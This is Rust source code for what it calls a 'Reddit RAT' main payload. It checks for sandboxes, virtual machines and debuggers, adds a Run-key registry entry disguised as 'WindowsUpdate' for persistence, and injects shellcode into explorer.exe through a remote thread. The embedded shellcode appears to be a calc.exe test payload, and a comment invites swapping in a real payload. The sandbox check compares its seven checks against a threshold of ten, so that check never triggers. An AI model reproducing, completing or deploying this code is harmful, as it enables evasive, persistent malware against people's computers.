// reddit/src/main.rs
// Anti-analysis + Registry Persistence + Process Injection

extern crate winapi;
extern crate chrono;

use std::ptr;
use std::mem;
use std::thread;
use std::time::Duration;
use winapi::um::winreg::{RegOpenKeyExW, RegSetValueExW, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
use winapi::um::winnt::{KEY_WRITE, REG_SZ, KEY_READ};
use winapi::shared::minwindef::{HKEY, DWORD};
use winapi::um::handleapi::CloseHandle;
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
    PROCESSENTRY32W, TH32CS_SNAPPROCESS
};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{
    OpenProcess, CreateRemoteThread
};
use winapi::um::winnt::{
    PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, MEMORYSTATUSEX, GetTickCount};
use winapi::um::debugapi::IsDebuggerPresent;

// ===== STRINGS =====
const REG_PATH: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";
const STARTUP_NAME: &str = "WindowsUpdate";
const EXPLORER_NAME: &str = "explorer.exe";

// ===== ANTI-ANALYSIS CONSTANTS =====
const BLACKLISTED_PROCESSES: [&str; 15] = [
    "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
    "vmwareuser.exe", "xenservice.exe", "procmon.exe", "wireshark.exe",
    "processhacker.exe", "ollydbg.exe", "x64dbg.exe", "ida64.exe",
    "ida.exe", "windbg.exe", "dumpcap.exe"
];

const VM_FILES: [&str; 8] = [
    r"C:\Windows\System32\drivers\vmmouse.sys",
    r"C:\Windows\System32\drivers\vmhgfs.sys",
    r"C:\Windows\System32\drivers\VBoxGuest.sys",
    r"C:\Windows\System32\drivers\vboxsf.sys",
    r"C:\Windows\System32\drivers\vboxvideo.sys",
    r"C:\Windows\System32\drivers\xenbus.sys",
    r"C:\Windows\System32\drivers\xen.sys",
    r"C:\Windows\System32\drivers\vmci.sys"
];

const ANALYSIS_REGISTRY_KEYS: [&str; 8] = [
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ProcessHacker",
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Wireshark",
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OLLYDBG",
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\x64dbg",
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\IDA Pro",
    r"SOFTWARE\Classes\Wireshark",
    r"SOFTWARE\Wireshark",
    r"SOFTWARE\ProcessHacker"
];

const SUSPICIOUS_USERNAMES: [&str; 10] = [
    "sandbox", "virus", "malware", "analysis", "sample",
    "vmware", "virtual", "admin", "user", "test"
];

// ===== STRUCTURES =====
#[derive(Debug, Clone)]
struct ProcessInfo {
    pid: u32,
    name: [u16; 260],
}

// ===== PROCESS LIST FUNCTIONS =====
fn get_process_list() -> Vec<ProcessInfo> {
    let mut processes = Vec::new();
    
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot.is_null() {
            return processes;
        }
        
        let mut pe32: PROCESSENTRY32W = mem::zeroed();
        pe32.dwSize = mem::size_of::<PROCESSENTRY32W>() as DWORD;
        
        if Process32FirstW(snapshot, &mut pe32) != 0 {
            loop {
                let mut name_buf = [0u16; 260];
                let mut i = 0;
                while i < 260 && pe32.szExeFile[i] != 0 {
                    name_buf[i] = pe32.szExeFile[i];
                    i += 1;
                }
                
                processes.push(ProcessInfo {
                    pid: pe32.th32ProcessID,
                    name: name_buf,
                });
                
                if Process32NextW(snapshot, &mut pe32) == 0 {
                    break;
                }
            }
        }
        
        CloseHandle(snapshot);
    }
    
    processes
}

// ===== ANTI-ANALYSIS FUNCTIONS =====
fn check_cpu_count() -> bool {
    println!("[*] Checking CPU count...");
    
    unsafe {
        let mut system_info: winapi::um::sysinfoapi::SYSTEM_INFO = mem::zeroed();
        winapi::um::sysinfoapi::GetSystemInfo(&mut system_info);
        
        let cpu_count = system_info.dwNumberOfProcessors;
        println!("[*] CPU count: {}", cpu_count);
        
        if cpu_count <= 2 {
            println!("[!] Low CPU count detected (sandbox)");
            return true;
        }
    }
    
    false
}

fn check_virtual_machine() -> bool {
    println!("[*] Checking for VM environment...");
    
    for &file in &VM_FILES {
        if std::path::Path::new(file).exists() {
            println!("[!] Detected VM driver: {}", file);
            return true;
        }
    }
    
    let processes = get_process_list();
    for process in &processes {
        let process_name = String::from_utf16_lossy(&process.name[..]);
        let process_name_lower = process_name.to_lowercase();
        
        for &bad_proc in &BLACKLISTED_PROCESSES {
            if process_name_lower.contains(bad_proc) {
                println!("[!] Detected VM process: {}", bad_proc);
                return true;
            }
        }
    }
    
    false
}

fn check_analysis_registry() -> bool {
    println!("[*] Checking registry for analysis tools...");
    
    unsafe {
        let mut key_handle: HKEY = ptr::null_mut();
        
        for &key in &ANALYSIS_REGISTRY_KEYS {
            let key_wide: Vec<u16> = key.encode_utf16().chain(Some(0)).collect();
            
            let result = RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                key_wide.as_ptr(),
                0,
                KEY_READ,
                &mut key_handle
            );
            
            if result == 0 && !key_handle.is_null() {
                println!("[!] Found analysis registry key: {}", key);
                CloseHandle(key_handle as _);
                return true;
            }
            
            if !key_handle.is_null() {
                CloseHandle(key_handle as _);
            }
        }
    }
    
    false
}

fn check_ram_size() -> bool {
    println!("[*] Checking RAM size...");
    
    unsafe {
        let mut memory_status: MEMORYSTATUSEX = mem::zeroed();
        memory_status.dwLength = mem::size_of::<MEMORYSTATUSEX>() as u32;
        
        if GlobalMemoryStatusEx(&mut memory_status) != 0 {
            let ram_gb = memory_status.ullTotalPhys / (1024 * 1024 * 1024);
            println!("[*] RAM: {} GB", ram_gb);
            
            if ram_gb < 4 {
                println!("[!] Low RAM detected (sandbox)");
                return true;
            }
        }
    }
    
    false
}

fn check_debugger() -> bool {
    println!("[*] Checking for debugger...");
    
    unsafe {
        if IsDebuggerPresent() != 0 {
            println!("[!] Debugger detected!");
            return true;
        }
    }
    
    false
}

fn check_uptime() -> bool {
    println!("[*] Checking system uptime...");
    
    unsafe {
        let uptime_ms = GetTickCount();
        let uptime_minutes = uptime_ms / (1000 * 60);
        
        println!("[*] Uptime: {} minutes", uptime_minutes);
        
        if uptime_minutes < 15 {
            println!("[!] Low uptime detected (sandbox)");
            return true;
        }
    }
    
    false
}

fn check_username() -> bool {
    println!("[*] Checking username...");
    
    match std::env::var("USERNAME") {
        Ok(username) => {
            let username_lower = username.to_lowercase();
            for &suspicious in &SUSPICIOUS_USERNAMES {
                if username_lower.contains(suspicious) {
                    println!("[!] Suspicious username: {}", username);
                    return true;
                }
            }
        },
        Err(_) => {}
    }
    
    false
}

fn perform_anti_analysis_checks() -> bool {
    println!("\n[*] Starting anti-analysis checks...");
    println!("=================================");
    
    let checks = [
        ("CPU Count", check_cpu_count as fn() -> bool),
        ("Virtual Machine", check_virtual_machine),
        ("Registry Analysis", check_analysis_registry),
        ("RAM Size", check_ram_size),
        ("Debugger", check_debugger),
        ("Uptime", check_uptime),
        ("Username", check_username),
    ];
    
    let mut detected_count =0;
    
    for (name, check) in checks.iter() {
        print!("[*] {}: ", name);
        if check() {
            println!("  [DETECTED]");
            detected_count += 1;
        } else {
            println!("  [CLEAN]");
        }
    }
    
    println!("=================================");
    println!("[*] Total detections: {}/{}", detected_count, checks.len());
    
    detected_count >= 10
}

// ===== REGISTRY PERSISTENCE =====
fn setup_registry_persistence() -> Result<(), String> {
    println!("[*] Setting up registry persistence...");
    
    let reg_path_wide: Vec<u16> = REG_PATH.encode_utf16().chain(Some(0)).collect();
    let startup_name_wide: Vec<u16> = STARTUP_NAME.encode_utf16().chain(Some(0)).collect();
    
    let current_exe = std::env::current_exe()
        .map_err(|e| format!("Failed to get current exe path: {}", e))?;
    let payload_path = current_exe.to_string_lossy().to_string();
    let payload_path_wide: Vec<u16> = payload_path.encode_utf16().chain(Some(0)).collect();
    
    println!("[*] Registry path: HKEY_CURRENT_USER\\{}", REG_PATH);
    println!("[*] Payload path: {}", payload_path);
    
    let mut registry_key_handle: HKEY = ptr::null_mut();
    let result = unsafe {
        RegOpenKeyExW(
            HKEY_CURRENT_USER,
            reg_path_wide.as_ptr(),
            0,
            KEY_WRITE,
            &mut registry_key_handle,
        )
    };
    
    if result != 0 {
        return Err(format!("Couldn't open registry key: error code {}", result));
    }
    
    let data_size = ((payload_path_wide.len()) * 2) as DWORD;
    
    let set_result = unsafe {
        RegSetValueExW(
            registry_key_handle,
            startup_name_wide.as_ptr(),
            0,
            REG_SZ,
            payload_path_wide.as_ptr() as *const u8,
            data_size,
        )
    };
    
    unsafe { CloseHandle(registry_key_handle as _); }
    
    if set_result != 0 {
        return Err(format!("Failed to set registry value: {}", set_result));
    }
    
    println!("[+] Registry persistence established as 'WindowsUpdate'");
    Ok(())
}

// ===== PROCESS INJECTION =====
fn inject_into_explorer(shellcode: &[u8]) -> Result<(), String> {
    println!("[*] Attempting to inject into explorer.exe...");
    
    let processes = get_process_list();
    let mut target_pid = 0;
    
    for process in &processes {
        let process_name = String::from_utf16_lossy(&process.name[..]);
        let process_name_trimmed = process_name.trim_matches(char::from(0));
        
        if !process_name_trimmed.is_empty() && process_name_trimmed.to_lowercase() == EXPLORER_NAME {
            target_pid = process.pid;
            println!("[+] Found explorer.exe (PID: {})", process.pid);
            break;
        }
    }
    
    if target_pid == 0 {
        return Err("Could not find explorer.exe".to_string());
    }
    
    unsafe {
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, target_pid);
        if process_handle == ptr::null_mut() {
            return Err(format!("Failed to open process: Error code {}", GetLastError()));
        }
        
        let allocation = VirtualAllocEx(
            process_handle,
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        
        if allocation == ptr::null_mut() {
            CloseHandle(process_handle);
            return Err(format!("VirtualAllocEx failed: Error code {}", GetLastError()));
        }
        
        println!("[+] Allocated memory at {:p}", allocation);
        
        let mut bytes_written = 0;
        let write_result = WriteProcessMemory(
            process_handle,
            allocation,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written
        );
        
        if write_result == 0 {
            CloseHandle(process_handle);
            return Err(format!("WriteProcessMemory failed: Error code {}", GetLastError()));
        }
        
        println!("[+] Wrote {} bytes to target process", bytes_written);
        
        let thread_handle = CreateRemoteThread(
            process_handle,
            ptr::null_mut(),
            0,
            Some(mem::transmute(allocation)),
            ptr::null_mut(),
            0,
            ptr::null_mut()
        );
        
        if thread_handle == ptr::null_mut() {
            CloseHandle(process_handle);
            return Err(format!("CreateRemoteThread failed: Error code {}", GetLastError()));
        }
        
        println!("[+] Created remote thread successfully");
        
        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    }
    
    Ok(())
}

// ===== MAIN FUNCTION =====
fn main() {
    println!("===================================");
    println!("Reddit RAT - Main Payload");
    println!("===================================\n");
    
    if perform_anti_analysis_checks() {
        println!("[!] Analysis environment detected! Exiting...");
        thread::sleep(Duration::from_secs(2));
        return;
    }
    println!("[+] Anti-analysis checks passed.\n");
    
    match setup_registry_persistence() {
        Ok(_) => println!("[+] Registry persistence completed\n"),
        Err(e) => eprintln!("[!] Registry persistence error: {}\n", e),
    }
    
                         // ===== SHELLCODE ===== 
    
    // Put the actual payload here and use calc here for testing purposes only.
    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
        0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
        0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
        0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
        0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
        0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
        0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];
    
    println!("[*] Attempting process injection...");
    match inject_into_explorer(&shellcode) {
        Ok(_) => println!("[+] Injection successful!"),
        Err(e) => eprintln!("[!] Injection failed: {}", e),
    }
    
    println!("\n[*] RAT entering maintenance loop...");
    loop {
        thread::sleep(Duration::from_secs(60));
        println!("[*] RAT still running...");
    }
}
